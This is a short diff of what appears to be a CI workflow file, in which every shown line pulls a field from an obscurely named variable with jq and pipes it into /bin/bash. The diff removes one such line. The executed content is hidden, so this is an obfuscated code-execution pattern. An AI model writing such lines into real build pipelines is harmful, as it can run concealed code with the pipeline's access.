@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$lxnnv637" | jq -r .b584 | /bin/bash
           echo $jb3012 | jq -r .g73 | /bin/bash
           echo $dyipl8 | jq -r .ohccj2 | /bin/bash
-          echo $ge71 | jq -r .occx6405 | /bin/bash
           echo $c23427 | jq -r .py5 | /bin/bash
           echo $vv0409 | jq -r .s0 | /bin/bash
           echo $rq13505 | jq -r .elad67596 | /bin/bash
